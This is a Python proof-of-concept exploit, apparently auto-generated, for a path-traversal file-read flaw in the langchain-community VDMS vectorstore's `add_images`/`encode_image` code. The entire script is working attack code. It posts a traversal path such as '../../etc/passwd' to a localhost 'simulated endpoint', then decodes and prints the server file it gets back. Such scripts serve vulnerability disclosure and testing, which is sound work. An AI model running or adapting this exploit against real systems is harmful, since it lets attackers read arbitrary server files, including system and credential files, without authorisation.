#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-005
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_13.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only VDMS vectorstore.

Vulnerability: The `add_images` method accepts a list of file paths (`uris`)
              and passes them directly to `encode_image`, which opens the file
              without any path validation. An attacker can supply paths like
              '../../etc/passwd' to read arbitrary files from the server.

Usage:
    python3 poc_lfi.py [--target http://localhost:8000] [--file /etc/passwd]

The script sends a POST request to the simulated endpoint that triggers
`add_images` with a malicious path. The response will contain the base64-encoded
contents of the target file.
"""

import argparse
import base64
import sys
import requests

def exploit(target_url: str, file_path: str) -> None:
    """
    Send a malicious request to read an arbitrary file via path traversal.

    Args:
        target_url: Base URL of the vulnerable service (e.g., http://localhost:8000)
        file_path: Path to the file to read (e.g., /etc/passwd or ../../etc/passwd)
    """
    # The simulated endpoint expects a POST to /api/v1/trigger
    # with a JSON body containing the untrusted user input.
    # The input is passed directly as the `uris` parameter to `add_images`.
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"

    # Craft the payload: a list containing the traversal path
    # Using a benign default (/etc/hostname) to avoid breaking things
    payload = {
        "untrusted_user_input": [file_path]  # This becomes `uris` in add_images
    }

    print(f"[*] Targeting: {endpoint}")
    print(f"[*] Attempting to read: {file_path}")
    print(f"[*] Payload: {payload}")

    try:
        # Send POST request with a reasonable timeout
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )

        # Check if the request was successful
        if response.status_code == 200:
            print("[+] Request succeeded!")
            # The response should contain the base64-encoded file content
            # (as returned by encode_image -> base64.b64encode(blob).decode())
            result = response.json()
            print(f"[+] Response: {result}")

            # Try to decode the base64 content if present
            # The exact response format depends on the simulated endpoint,
            # but typically it returns the list of base64 strings.
            if isinstance(result, list) and len(result) > 0:
                b64_content = result[0]
                try:
                    decoded = base64.b64decode(b64_content).decode('utf-8', errors='replace')
                    print(f"\n[+] Decoded file content:\n{decoded}")
                except Exception:
                    print(f"[!] Could not decode base64 content: {b64_content[:100]}...")
            elif isinstance(result, dict) and "result" in result:
                b64_content = result["result"]
                if isinstance(b64_content, list) and len(b64_content) > 0:
                    try:
                        decoded = base64.b64decode(b64_content[0]).decode('utf-8', errors='replace')
                        print(f"\n[+] Decoded file content:\n{decoded}")
                    except Exception:
                        print(f"[!] Could not decode base64 content: {b64_content[0][:100]}...")
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")

    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {endpoint}")
        print("    Make sure the target service is running and accessible.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out after 10 seconds.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community VDMS vectorstore"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--file",
        default="/etc/hostname",
        help="File to read via path traversal (default: /etc/hostname)"
    )
    args = parser.parse_args()

    print("=" * 60)
    print("LFI Exploit PoC for langchain-community VDMS")
    print("=" * 60)
    print()

    exploit(args.target, args.file)


if __name__ == "__main__":
    main()
